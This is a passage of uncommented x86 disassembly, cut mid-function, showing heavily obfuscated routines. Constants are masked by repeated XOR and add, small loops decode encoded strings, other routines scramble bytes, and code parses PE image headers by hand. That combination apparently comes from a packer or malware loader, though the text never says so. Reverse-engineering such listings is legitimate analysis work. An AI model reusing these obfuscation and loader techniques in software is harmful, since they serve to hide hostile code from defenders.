  427f90:	cmp    ebx,DWORD PTR [ebp-0x8]
  427f93:	jb     0x427f29
  427f95:	pop    esi
  427f96:	pop    ebx
  427f97:	pop    edi
  427f98:	leave  
  427f99:	ret    0x4
  427f9c:	push   ebp
  427f9d:	mov    ebp,esp
  427f9f:	mov    eax,DWORD PTR [ebp+0x8]
  427fa2:	push   esi
  427fa3:	push   DWORD PTR [eax+0x1e0]
  427fa9:	lea    esi,[eax+0x198]
  427faf:	mov    eax,DWORD PTR [ebp+0x8]
  427fb2:	call   0x427e4b
  427fb7:	mov    ecx,DWORD PTR [esi]
  427fb9:	mov    DWORD PTR [ecx],eax
  427fbb:	mov    eax,DWORD PTR [esi]
  427fbd:	xor    ecx,ecx
  427fbf:	cmp    DWORD PTR [eax],ecx
  427fc1:	pop    esi
  427fc2:	setne  cl
  427fc5:	mov    eax,ecx
  427fc7:	pop    ebp
  427fc8:	ret    0x4
  427fcb:	mov    ecx,DWORD PTR [edi+0x188]
  427fd1:	push   ebx
  427fd2:	jmp    0x427fe7
  427fd4:	xor    eax,0x8a98
  427fd9:	add    eax,0x3b5a
  427fde:	mov    WORD PTR [ecx],ax
  427fe1:	add    ecx,0x2
  427fe4:	add    edx,0x2
  427fe7:	movzx  eax,WORD PTR [edx]
  427fea:	mov    ebx,0x4e3e
  427fef:	cmp    ax,bx
  427ff2:	jne    0x427fd4
  427ff4:	xor    eax,eax
  427ff6:	mov    WORD PTR [ecx],ax
  427ff9:	mov    eax,DWORD PTR [edi+0x188]
  427fff:	pop    ebx
  428000:	ret    
  428001:	push   edi
  428002:	mov    edi,eax
  428004:	mov    eax,DWORD PTR [esi+0x188]
  42800a:	shl    edi,0x6
  42800d:	add    eax,edi
  42800f:	jmp    0x42801a
  428011:	xor    cl,0x7c
  428014:	inc    cl
  428016:	mov    BYTE PTR [eax],cl
  428018:	inc    eax
  428019:	inc    edx
  42801a:	mov    cl,BYTE PTR [edx]
  42801c:	cmp    cl,0x83
  42801f:	jne    0x428011
  428021:	mov    BYTE PTR [eax],0x0
  428024:	mov    eax,DWORD PTR [esi+0x188]
  42802a:	add    eax,edi
  42802c:	pop    edi
  42802d:	ret    
  42802e:	push   ebp
  42802f:	mov    ebp,esp
  428031:	sub    esp,0x14
  428034:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  42803b:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  428042:	mov    eax,DWORD PTR [ebx]
  428044:	mov    DWORD PTR [ebp-0x8],eax
  428047:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42804e:	push   esi
  42804f:	push   edi
  428050:	mov    DWORD PTR [ebp-0x14],0xead71885
  428057:	mov    edi,DWORD PTR [ebp-0x4]
  42805a:	mov    ecx,DWORD PTR [ebp-0x10]
  42805d:	mov    eax,0x75108aa
  428062:	xor    edi,eax
  428064:	mov    edx,0x3272f1
  428069:	xor    ecx,eax
  42806b:	add    edi,edx
  42806d:	add    ecx,edx
  42806f:	imul   edi,ecx
  428072:	jmp    0x4280ba
  428074:	mov    ecx,DWORD PTR [ebp-0x8]
  428077:	mov    esi,DWORD PTR [ebp-0x4]
  42807a:	xor    ecx,eax
  42807c:	xor    esi,eax
  42807e:	add    ecx,edx
  428080:	add    esi,edx
  428082:	test   esi,ecx
  428084:	mov    esi,DWORD PTR [ebp-0x8]
  428087:	mov    ecx,DWORD PTR [ebp-0x4]
  42808a:	je     0x4280a1
  42808c:	xor    ecx,eax
  42808e:	xor    esi,eax
  428090:	add    ecx,edx
  428092:	add    esi,edx
  428094:	shr    esi,cl
  428096:	mov    ecx,DWORD PTR [ebp-0x14]
  428099:	xor    ecx,eax
  42809b:	add    ecx,edx
  42809d:	xor    esi,ecx
  42809f:	jmp    0x4280ab
  4280a1:	xor    esi,eax
  4280a3:	xor    ecx,eax
  4280a5:	add    esi,edx
  4280a7:	add    ecx,edx
  4280a9:	shr    esi,cl
  4280ab:	mov    DWORD PTR [ebp-0x8],esi
  4280ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4280b1:	xor    ecx,eax
  4280b3:	lea    edi,[edi+ecx*1+0x3272f1]
  4280ba:	mov    ecx,DWORD PTR [ebp-0xc]
  4280bd:	mov    esi,DWORD PTR [ebp-0x4]
  4280c0:	xor    esi,eax
  4280c2:	xor    ecx,eax
  4280c4:	sub    ecx,esi
  4280c6:	cmp    edi,ecx
  4280c8:	jbe    0x428074
  4280ca:	mov    eax,DWORD PTR [ebp-0x8]
  4280cd:	pop    edi
  4280ce:	mov    DWORD PTR [ebx],eax
  4280d0:	mov    eax,DWORD PTR [ebp-0x8]
  4280d3:	pop    esi
  4280d4:	leave  
  4280d5:	ret    
  4280d6:	push   ebp
  4280d7:	mov    ebp,esp
  4280d9:	sub    esp,0x38
  4280dc:	push   ebx
  4280dd:	mov    ebx,0xf89c85a5
  4280e2:	mov    DWORD PTR [ebp-0x4],ebx
  4280e5:	lea    ecx,[ebx+0x15]
  4280e8:	mov    DWORD PTR [ebp-0x24],ecx
  4280eb:	mov    eax,DWORD PTR [ebp-0x4]
  4280ee:	mov    edx,DWORD PTR [ebp+0x8]
  4280f1:	push   esi
  4280f2:	mov    esi,0x75108aa
  4280f7:	xor    eax,esi
  4280f9:	push   edi
  4280fa:	mov    edi,0x3272f1
  4280ff:	add    eax,edi
  428101:	cmp    edx,eax
  428103:	mov    eax,DWORD PTR [ebp-0x4]
  428106:	je     0x42826a
  42810c:	mov    edx,DWORD PTR [ebp+0xc]
  42810f:	xor    eax,esi
  428111:	add    eax,edi
  428113:	cmp    edx,eax
  428115:	je     0x428267
  42811b:	mov    eax,DWORD PTR [ebp+0x10]
  42811e:	mov    edx,DWORD PTR [ebp+0xc]
  428121:	mov    DWORD PTR [ebp-0x14],eax
  428124:	mov    eax,DWORD PTR [ebp+0x8]
  428127:	mov    DWORD PTR [ebp-0x18],0xf89c853f
  42812e:	mov    DWORD PTR [ebp-0xc],eax
  428131:	lea    eax,[ebx+0x16]
  428134:	mov    DWORD PTR [ebp-0x1c],eax
  428137:	mov    DWORD PTR [ebp-0x10],ebx
  42813a:	mov    DWORD PTR [ebp+0xc],ecx
  42813d:	mov    DWORD PTR [ebp+0x10],eax
  428140:	mov    eax,DWORD PTR [ebp+0xc]
  428143:	xor    eax,esi
  428145:	mov    DWORD PTR [ebp-0x20],edx
  428148:	sub    edx,eax
  42814a:	sub    edx,edi
  42814c:	mov    DWORD PTR [ebp+0x8],edx
  42814f:	mov    DWORD PTR [ebp-0x8],0xf89c85be
  428156:	jmp    0x428257
  42815b:	mov    eax,DWORD PTR [ebp+0xc]
  42815e:	mov    ecx,DWORD PTR [ebp+0xc]
  428161:	xor    eax,esi
  428163:	xor    ecx,esi
  428165:	lea    ecx,[eax+ecx*1+0x64e5e2]
  42816c:	mov    eax,DWORD PTR [ebp+0x8]
  42816f:	xor    edx,edx
  428171:	div    ecx
  428173:	mov    eax,DWORD PTR [ebp+0x10]
  428176:	mov    ecx,DWORD PTR [ebp+0xc]
  428179:	xor    eax,esi
  42817b:	xor    ecx,esi
  42817d:	sub    eax,ecx
  42817f:	cmp    edx,eax
  428181:	jne    0x428216
  428187:	mov    eax,DWORD PTR [ebp+0x8]
  42818a:	mov    ecx,DWORD PTR [ebp-0xc]
  42818d:	mov    dl,BYTE PTR [eax+ecx*1]
  428190:	mov    eax,DWORD PTR [ebp-0x10]
  428193:	mov    ecx,DWORD PTR [ebp-0x8]
  428196:	xor    eax,esi
  428198:	xor    ecx,esi
  42819a:	add    eax,edi
  42819c:	add    ecx,edi
  42819e:	cmp    eax,ecx
  4281a0:	jae    0x4281e8
  4281a2:	lea    ecx,[eax-0x3272f1]
  4281a8:	mov    DWORD PTR [ebp-0x4],ecx
  4281ab:	mov    ebx,DWORD PTR [ebp-0x4]
  4281ae:	xor    ebx,esi
  4281b0:	add    ebx,0x7f55d8fb
  4281b6:	lea    ecx,[ebp+eax*4-0x38]
  4281ba:	mov    DWORD PTR [ecx],ebx
  4281bc:	mov    ebx,DWORD PTR [ecx]
  4281be:	cmp    ebx,0x244ecb98
  4281c4:	jbe    0x4281ce
  4281c6:	add    DWORD PTR [ecx],0x405fcd9
  4281cc:	jmp    0x4281d4
  4281ce:	add    DWORD PTR [ecx],0xfdaf4327
  4281d4:	mov    ecx,DWORD PTR [ebp-0x8]
  4281d7:	xor    ecx,esi
  4281d9:	inc    eax
  4281da:	inc    DWORD PTR [ebp-0x4]
  4281dd:	add    ecx,edi
  4281df:	cmp    eax,ecx
  4281e1:	jb     0x4281ab
  4281e3:	mov    ebx,0xf89c85a5
  4281e8:	cmp    DWORD PTR [ebp-0x14],0x0
  4281ec:	jne    0x4281f5
  4281ee:	xor    dl,0x7c
  4281f1:	inc    dl
  4281f3:	jmp    0x42820b
  4281f5:	mov    eax,DWORD PTR [ebp-0x18]
  4281f8:	xor    al,0xaa
  4281fa:	mov    cl,0xf
  4281fc:	sub    cl,al
  4281fe:	add    dl,cl
  428200:	mov    ecx,DWORD PTR [ebp-0x1c]
  428203:	xor    cl,0xaa
  428206:	sub    cl,0xf
  428209:	ror    dl,cl
  42820b:	xor    eax,eax
  42820d:	mov    eax,DWORD PTR [ebp+0x8]
  428210:	mov    ecx,DWORD PTR [ebp-0xc]
  428213:	mov    BYTE PTR [eax+ecx*1],dl
  428216:	mov    eax,DWORD PTR [ebp+0x8]
  428219:	mov    ecx,DWORD PTR [ebp-0x10]
  42821c:	sub    eax,edi
  42821e:	xor    eax,esi
  428220:	cmp    eax,ecx
  428222:	jne    0x428245
  428224:	mov    eax,DWORD PTR [ebp+0x10]
  428227:	mov    ecx,DWORD PTR [ebp+0xc]
  42822a:	xor    eax,esi
  42822c:	xor    ecx,esi
  42822e:	sub    eax,ecx
  428230:	mov    ecx,DWORD PTR [ebp-0x20]
  428233:	sub    eax,edi
  428235:	xor    eax,esi
  428237:	mov    DWORD PTR [ebp+0x10],eax
  42823a:	mov    eax,DWORD PTR [ebp+0xc]
  42823d:	xor    eax,esi
  42823f:	sub    ecx,eax
  428241:	sub    ecx,edi
  428243:	jmp    0x428254
  428245:	mov    eax,DWORD PTR [ebp+0xc]
  428248:	xor    eax,esi
  42824a:	mov    ecx,0xffcd8d0f
  42824f:	sub    ecx,eax
  428251:	add    ecx,DWORD PTR [ebp+0x8]
  428254:	mov    DWORD PTR [ebp+0x8],ecx
  428257:	mov    eax,DWORD PTR [ebp+0x10]
  42825a:	cmp    eax,ebx
  42825c:	jne    0x42815b
  428262:	mov    eax,DWORD PTR [ebp-0x24]
  428265:	jmp    0x42826a
  428267:	mov    eax,DWORD PTR [ebp-0x4]
  42826a:	xor    eax,esi
  42826c:	add    eax,edi
  42826e:	pop    edi
  42826f:	pop    esi
  428270:	pop    ebx
  428271:	leave  
  428272:	ret    0xc
  428275:	push   ebp
  428276:	mov    ebp,esp
  428278:	sub    esp,0x420
  42827e:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  428285:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  42828c:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  428293:	push   ebx
  428294:	mov    DWORD PTR [ebp-0x1c],0xf89c85a4
  42829b:	mov    eax,DWORD PTR [ebp-0x14]
  42829e:	push   esi
  42829f:	mov    esi,0x75108aa
  4282a4:	push   edi
  4282a5:	xor    eax,esi
  4282a7:	mov    edi,0x3272f1
  4282ac:	add    eax,edi
  4282ae:	mov    DWORD PTR [ebp-0x8],eax
  4282b1:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  4282b8:	mov    DWORD PTR [ebp-0x4],0xead71885
  4282bf:	mov    DWORD PTR [ebp-0x10],0x8
  4282c6:	mov    ecx,ecx
  4282c8:	mov    eax,DWORD PTR [ebp-0xc]
  4282cb:	mov    ecx,DWORD PTR [ebp-0x14]
  4282ce:	xor    eax,esi
  4282d0:	xor    ecx,esi
  4282d2:	add    eax,edi
  4282d4:	add    ecx,edi
  4282d6:	imul   eax,ecx
  4282d9:	jmp    0x42830c
  4282db:	mov    eax,DWORD PTR [ebp-0x4]
  4282de:	sub    eax,edi
  4282e0:	xor    eax,esi
  4282e2:	mov    DWORD PTR [ebp-0x8],eax
  4282e5:	lea    ebx,[ebp-0x8]
  4282e8:	call   0x42802e
  4282ed:	mov    DWORD PTR [ebp-0x8],eax
  4282f0:	mov    eax,DWORD PTR [ebp-0x8]
  4282f3:	mov    ecx,DWORD PTR [ebp-0x4]
  4282f6:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  4282fd:	mov    eax,DWORD PTR [ebp-0xc]
  428300:	mov    ecx,DWORD PTR [ebp-0x4]
  428303:	xor    eax,esi
  428305:	lea    eax,[eax+ecx*1+0x3272f1]
  42830c:	mov    DWORD PTR [ebp-0x4],eax
  42830f:	mov    eax,DWORD PTR [ebp-0x18]
  428312:	mov    ecx,DWORD PTR [ebp-0xc]
  428315:	xor    ecx,esi
  428317:	xor    eax,esi
  428319:	sub    eax,ecx
  42831b:	mov    ecx,DWORD PTR [ebp-0x4]
  42831e:	cmp    ecx,eax
  428320:	jbe    0x4282db
  428322:	mov    eax,DWORD PTR [ebp-0x1c]
  428325:	xor    eax,esi
  428327:	add    eax,edi
  428329:	mov    DWORD PTR [ebp-0x8],eax
  42832c:	mov    DWORD PTR [ebp-0x18],0xf89c86a4
  428333:	mov    ebx,ebx
  428335:	jmp    0x428398
  428337:	mov    ecx,DWORD PTR [ebp-0x20]
  42833a:	mov    eax,DWORD PTR [ebp-0x8]
  42833d:	xor    ecx,esi
  42833f:	add    ecx,edi
  428341:	shr    eax,cl
  428343:	mov    DWORD PTR [ebp-0x4],eax
  428346:	mov    eax,DWORD PTR [ebp+0x8]
  428349:	mov    cl,BYTE PTR [eax]
  42834b:	mov    BYTE PTR [ebp+0xb],cl
  42834e:	mov    cl,BYTE PTR [ebp+0xb]
  428351:	mov    edx,DWORD PTR [ebp-0x8]
  428354:	movzx  ecx,cl
  428357:	xor    ecx,edx
  428359:	mov    DWORD PTR [ebp+0x8],ecx
  42835c:	mov    ecx,DWORD PTR [ebp-0x18]
  42835f:	mov    edx,DWORD PTR [ebp+0x8]
  428362:	xor    ecx,esi
  428364:	add    ecx,edi
  428366:	and    ecx,edx
  428368:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  42836f:	mov    edx,DWORD PTR [ebp-0x4]
  428372:	xor    ecx,edx
  428374:	mov    DWORD PTR [ebp-0x8],ecx
  428377:	mov    ecx,DWORD PTR [ebp-0xc]
  42837a:	xor    ecx,esi
  42837c:	lea    eax,[eax+ecx*1+0x3272f1]
  428383:	mov    DWORD PTR [ebp+0x8],eax
  428386:	mov    eax,DWORD PTR [ebp-0xc]
  428389:	xor    eax,esi
  42838b:	mov    ecx,0xffcd8d0f
  428390:	sub    ecx,eax
  428392:	add    ecx,DWORD PTR [ebp-0x10]
  428395:	mov    DWORD PTR [ebp-0x10],ecx
  428398:	mov    eax,DWORD PTR [ebp-0x14]
  42839b:	mov    ecx,DWORD PTR [ebp-0x10]
  42839e:	xor    eax,esi
  4283a0:	add    eax,edi
  4283a2:	cmp    ecx,eax
  4283a4:	jne    0x428337
  4283a6:	mov    eax,DWORD PTR [ebp-0x1c]
  4283a9:	mov    ecx,DWORD PTR [ebp-0x8]
  4283ac:	xor    eax,esi
  4283ae:	add    eax,edi
  4283b0:	pop    edi
  4283b1:	pop    esi
  4283b2:	xor    eax,ecx
  4283b4:	pop    ebx
  4283b5:	leave  
  4283b6:	ret    0x4
  4283b9:	push   ebp
  4283ba:	mov    ebp,esp
  4283bc:	mov    eax,DWORD PTR [ebp+0x1c]
  4283bf:	mov    ecx,DWORD PTR [ebp+0x8]
  4283c2:	mov    edx,DWORD PTR [ebp+0x10]
  4283c5:	mov    eax,DWORD PTR [eax+0x190]
  4283cb:	mov    eax,DWORD PTR [eax]
  4283cd:	sub    esp,0x64
  4283d0:	push   ebx
  4283d1:	push   esi
  4283d2:	push   edi
  4283d3:	mov    edi,0x75108aa
  4283d8:	xor    ecx,edi
  4283da:	mov    ebx,0x3272f1
  4283df:	add    ecx,ebx
  4283e1:	cmp    ecx,edx
  4283e3:	jne    0x4283f4
  4283e5:	or     DWORD PTR ds:0x3750c3f,0x4263eb2c
  4283ef:	jmp    0x4288f0
  4283f4:	mov    ecx,DWORD PTR [ebp+0x8]
  4283f7:	mov    esi,DWORD PTR [ebp+0x14]
  4283fa:	mov    edx,DWORD PTR [esi]
  4283fc:	xor    ecx,edi
  4283fe:	add    ecx,ebx
  428400:	cmp    edx,ecx
  428402:	je     0x4288ab
  428408:	mov    ecx,DWORD PTR [ebp+0x1c]
  42840b:	mov    DWORD PTR [ebp-0x1c],eax
  42840e:	mov    DWORD PTR [ebp+0x1c],ecx
  428411:	mov    ecx,DWORD PTR [ebp+0x18]
  428414:	mov    eax,DWORD PTR [esi]
  428416:	mov    DWORD PTR [ebp-0x20],eax
  428419:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  428420:	mov    edx,0xf89c85ba
  428425:	mov    DWORD PTR [ebp-0x8],edx
  428428:	mov    eax,DWORD PTR [ebp+0x1c]
  42842b:	mov    DWORD PTR [ebp+0x1c],eax
  42842e:	mov    eax,DWORD PTR [ebp+0x1c]
  428431:	mov    eax,DWORD PTR [eax+0x190]
  428437:	mov    eax,DWORD PTR [eax]
  428439:	mov    DWORD PTR [ebp-0x24],ecx
  42843c:	mov    ecx,DWORD PTR [ebp+0x1c]
  42843f:	mov    ecx,DWORD PTR [ecx+0x190]
  428445:	mov    ecx,DWORD PTR [ecx]
  428447:	add    ecx,DWORD PTR [eax+0x3c]
  42844a:	mov    DWORD PTR [ebp+0x10],ecx
  42844d:	mov    eax,DWORD PTR [ebp+0x8]
  428450:	xor    eax,edi
  428452:	add    eax,ebx
  428454:	mov    DWORD PTR [ebp-0x4],eax
  428457:	mov    eax,DWORD PTR [ebp+0x8]
  42845a:	xor    eax,edi
  42845c:	add    eax,ebx
  42845e:	mov    DWORD PTR [ebp+0x18],eax
  428461:	mov    eax,DWORD PTR [ebp+0x10]
  428464:	mov    eax,DWORD PTR [eax+0x50]
  428467:	sub    eax,0xc
  42846a:	mov    DWORD PTR [ebp-0x28],eax
  42846d:	mov    eax,DWORD PTR [ebp+0x10]
  428470:	mov    eax,DWORD PTR [eax+0x38]
  428473:	mov    ecx,DWORD PTR [ebp+0x10]
  428476:	dec    eax
  428477:	test   DWORD PTR [ecx+0x54],eax
  42847a:	mov    eax,DWORD PTR [ebp+0x10]
  42847d:	je     0x428497
  42847f:	mov    eax,DWORD PTR [eax+0x38]
  428482:	mov    ecx,DWORD PTR [ebp+0x10]
  428485:	mov    ecx,DWORD PTR [ecx+0x54]
  428488:	dec    eax
  428489:	not    eax
  42848b:	and    ecx,eax
  42848d:	mov    eax,DWORD PTR [ebp+0x10]
  428490:	mov    eax,DWORD PTR [eax+0x38]
  428493:	add    eax,ecx
  428495:	jmp    0x42849a
  428497:	mov    eax,DWORD PTR [eax+0x54]
  42849a:	mov    DWORD PTR [ebp+0x1c],eax
  42849d:	mov    eax,DWORD PTR [ebp+0x8]
  4284a0:	xor    eax,edi
  4284a2:	add    eax,ebx
  4284a4:	mov    DWORD PTR [ebp+0x18],eax
  4284a7:	mov    eax,DWORD PTR [ebp+0x8]
  4284aa:	xor    eax,edi
  4284ac:	add    eax,ebx
  4284ae:	mov    DWORD PTR [ebp+0x18],eax
  4284b1:	mov    eax,DWORD PTR [ebp+0x8]
  4284b4:	mov    ecx,DWORD PTR [ebp-0x24]
  4284b7:	xor    eax,edi
  4284b9:	add    eax,ebx
  4284bb:	mov    DWORD PTR [ecx],eax
  4284bd:	mov    DWORD PTR [ebp+0x18],edx
  4284c0:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  4284c7:	mov    DWORD PTR [ebp+0x18],0xf89c85b8
  4284ce:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  4284d5:	mov    eax,DWORD PTR [ebp-0x8]
  4284d8:	mov    ecx,DWORD PTR [ebp+0x1c]
  4284db:	xor    eax,edi
  4284dd:	add    eax,ebx
  4284df:	imul   eax,ecx
  4284e2:	mov    ecx,DWORD PTR [ebp+0x8]
  4284e5:	mov    edx,DWORD PTR [ebp-0x28]
  4284e8:	xor    ecx,edi
  4284ea:	lea    ecx,[ecx+edx*1+0x3272f1]
  4284f1:	cmp    eax,ecx
  4284f3:	jae    0x4288a4
  4284f9:	mov    eax,DWORD PTR [ebp+0x8]
  4284fc:	xor    eax,edi
  4284fe:	add    eax,ebx
  428500:	mov    DWORD PTR [ebp+0x18],eax
  428503:	mov    eax,DWORD PTR [ebp+0x1c]
  428506:	add    eax,DWORD PTR [ebp-0x1c]
  428509:	mov    DWORD PTR [ebp-0x4],eax
  42850c:	push   DWORD PTR [ebp-0x4]
  42850f:	mov    esi,DWORD PTR [ebp-0x1c]
  428512:	mov    ecx,DWORD PTR [ebp+0x10]
  428515:	call   0x427669
  42851a:	mov    DWORD PTR [ebp+0xc],eax
  42851d:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  428524:	mov    eax,DWORD PTR [ebp-0x18]
  428527:	xor    eax,edi
  428529:	lea    ecx,[ebp-0x40]
  42852c:	add    eax,ebx
  42852e:	push   ecx
  42852f:	call   0x427bfb
  428534:	mov    eax,DWORD PTR [ebp+0xc]
  428537:	test   eax,eax
  428539:	je     0x428589
  42853b:	mov    eax,DWORD PTR [ebp-0x18]
  42853e:	xor    eax,edi
  428540:	add    eax,ebx
  428542:	push   eax
  428543:	push   DWORD PTR [ebp+0xc]
  428546:	lea    eax,[ebp-0x40]
  428549:	push   eax
  42854a:	call   0x427af1
  42854f:	mov    eax,DWORD PTR [ebp-0x4]
  428552:	mov    DWORD PTR [ebp-0x18],eax
  428555:	mov    eax,DWORD PTR [ebp-0x18]
  428558:	mov    ecx,DWORD PTR [ebp-0x1c]
  42855b:	sub    eax,ecx
  42855d:	mov    DWORD PTR [ebp-0x18],eax
  428560:	mov    eax,DWORD PTR [ebp+0xc]
  428563:	mov    ecx,DWORD PTR [ebp+0xc]
  428566:	mov    eax,DWORD PTR [eax+0x10]
  428569:	add    eax,DWORD PTR [ecx+0xc]
  42856c:	mov    ecx,DWORD PTR [ebp-0x18]
  42856f:	cmp    ecx,eax
  428571:	jb     0x428589
  428573:	mov    eax,DWORD PTR [ebp+0xc]
  428576:	mov    eax,DWORD PTR [eax+0xc]
  428579:	mov    ecx,DWORD PTR [ebp+0xc]
  42857c:	add    eax,DWORD PTR [ecx+0x8]
  42857f:	mov    ecx,DWORD PTR [ebp-0x18]
  428582:	sub    eax,ecx
  428584:	jmp    0x428877
  428589:	push   0xc
  42858b:	push   DWORD PTR [ebp-0x4]
  42858e:	lea    eax,[ebp-0x4c]
  428591:	push   eax
  428592:	call   0x427af1
  428597:	mov    eax,0xf89c85a5
  42859c:	mov    DWORD PTR [ebp-0x2c],eax
  42859f:	mov    DWORD PTR [ebp-0x30],0xf89c85ba
  4285a6:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  4285ad:	mov    DWORD PTR [ebp-0x38],0xf89c85b8
  4285b4:	lea    ecx,[ebp-0x2c]
  4285b7:	mov    DWORD PTR [ebp-0xc],ecx
  4285ba:	lea    ecx,[ebp-0x30]
  4285bd:	mov    DWORD PTR [ebp-0x10],ecx
  4285c0:	lea    ecx,[ebp-0x34]
  4285c3:	mov    DWORD PTR [ebp+0xc],ecx
  4285c6:	lea    ecx,[ebp-0x38]
  4285c9:	mov    DWORD PTR [ebp-0x14],ecx
  4285cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4285cf:	xor    ecx,edi
  4285d1:	add    ecx,ebx
  4285d3:	mov    DWORD PTR [ebp-0x18],ecx
  4285d6:	jmp    0x4287d2
  4285db:	cmp    eax,0xf89c85bb
  4285e0:	je     0x4287e4
  4285e6:	mov    ecx,DWORD PTR [ebp-0x8]
  4285e9:	xor    ecx,edi
  4285eb:	mov    esi,eax
  4285ed:	add    ecx,ebx
  4285ef:	mov    DWORD PTR [ebp+0x18],ecx
  4285f2:	mov    eax,DWORD PTR [ebp-0x18]
  4285f5:	xor    esi,edi
  4285f7:	lea    eax,[eax+esi*1+0x3272f1]
  4285fe:	mov    DWORD PTR [ebp-0x18],eax
  428601:	mov    eax,DWORD PTR [ebp-0x8]
  428604:	mov    ecx,DWORD PTR [ebp-0x18]
  428607:	xor    eax,edi
  428609:	add    eax,ebx
  42860b:	cmp    ecx,eax
  42860d:	jne    0x428622
  42860f:	mov    eax,DWORD PTR [ebp+0x8]
  428612:	xor    eax,edi
  428614:	add    eax,ebx
  428616:	push   eax
  428617:	push   0xc
  428619:	lea    eax,[ebp-0x4c]
  42861c:	push   eax
  42861d:	call   0x4280d6
  428622:	mov    eax,DWORD PTR [ebp-0xc]
  428625:	mov    eax,DWORD PTR [eax]
  428627:	xor    eax,edi
  428629:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428630:	mov    ecx,DWORD PTR [ebp+0x8]
  428633:	xor    ecx,edi
  428635:	movzx  eax,al
  428638:	add    ecx,ebx
  42863a:	cmp    eax,ecx
  42863c:	je     0x4287ba
  428642:	mov    eax,DWORD PTR [ebp-0x10]
  428645:	mov    eax,DWORD PTR [eax]
  428647:	xor    eax,edi
  428649:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428650:	mov    ecx,DWORD PTR [ebp+0x8]
  428653:	xor    ecx,edi
  428655:	movzx  eax,al
  428658:	add    ecx,ebx
  42865a:	cmp    eax,ecx
  42865c:	je     0x4287ba
  428662:	mov    eax,DWORD PTR [ebp+0xc]
  428665:	mov    eax,DWORD PTR [eax]
  428667:	xor    eax,edi
  428669:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428670:	mov    ecx,DWORD PTR [ebp+0x8]
  428673:	xor    ecx,edi
  428675:	movzx  eax,al
  428678:	add    ecx,ebx
  42867a:	cmp    eax,ecx
  42867c:	je     0x4287ba
  428682:	mov    eax,DWORD PTR [ebp-0x14]
  428685:	mov    eax,DWORD PTR [eax]
  428687:	xor    eax,edi
  428689:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428690:	mov    ecx,DWORD PTR [ebp+0x8]
  428693:	xor    ecx,edi
  428695:	movzx  eax,al
  428698:	add    ecx,ebx
  42869a:	cmp    eax,ecx
  42869c:	je     0x4287ba
  4286a2:	mov    eax,DWORD PTR [ebp-0x10]
  4286a5:	mov    eax,DWORD PTR [eax]
  4286a7:	xor    eax,edi
  4286a9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  4286b0:	mov    ecx,DWORD PTR [ebp-0xc]
  4286b3:	mov    ecx,DWORD PTR [ecx]
  4286b5:	xor    ecx,edi
  4286b7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4286be:	xor    al,cl
  4286c0:	mov    ecx,DWORD PTR [ebp+0xc]
  4286c3:	mov    ecx,DWORD PTR [ecx]
  4286c5:	xor    ecx,edi
  4286c7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4286ce:	or     al,cl
  4286d0:	mov    ecx,DWORD PTR [ebp-0xc]
  4286d3:	mov    ecx,DWORD PTR [ecx]
  4286d5:	xor    ecx,edi
  4286d7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  4286de:	cmp    cl,al
  4286e0:	jne    0x4287ba
  4286e6:	mov    eax,DWORD PTR [ebp+0xc]
  4286e9:	mov    eax,DWORD PTR [eax]
  4286eb:	xor    eax,edi
  4286ed:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  4286f4:	mov    ecx,DWORD PTR [ebp-0x10]
  4286f7:	mov    ecx,DWORD PTR [ecx]
  4286f9:	xor    ecx,edi
  4286fb:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428702:	xor    al,cl
  428704:	mov    ecx,DWORD PTR [ebp-0x14]
  428707:	mov    ecx,DWORD PTR [ecx]
  428709:	xor    ecx,edi
  42870b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428712:	or     al,cl
  428714:	mov    ecx,DWORD PTR [ebp-0x10]
  428717:	mov    ecx,DWORD PTR [ecx]
  428719:	xor    ecx,edi
  42871b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428722:	cmp    cl,al
  428724:	jne    0x4287ba
  42872a:	mov    eax,DWORD PTR [ebp-0x14]
  42872d:	mov    eax,DWORD PTR [eax]
  42872f:	xor    eax,edi
  428731:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428738:	mov    ecx,DWORD PTR [ebp+0xc]
  42873b:	mov    ecx,DWORD PTR [ecx]
  42873d:	xor    ecx,edi
  42873f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428746:	xor    al,cl
  428748:	mov    ecx,DWORD PTR [ebp-0xc]
  42874b:	mov    ecx,DWORD PTR [ecx]
  42874d:	xor    ecx,edi
  42874f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428756:	or     al,cl
  428758:	mov    ecx,DWORD PTR [ebp+0xc]
  42875b:	mov    ecx,DWORD PTR [ecx]
  42875d:	xor    ecx,edi
  42875f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428766:	cmp    cl,al
  428768:	jne    0x4287ba
  42876a:	mov    eax,DWORD PTR [ebp-0x14]
  42876d:	mov    eax,DWORD PTR [eax]
  42876f:	xor    eax,edi
  428771:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428778:	mov    ecx,DWORD PTR [ebp-0xc]
  42877b:	mov    ecx,DWORD PTR [ecx]
  42877d:	xor    ecx,edi
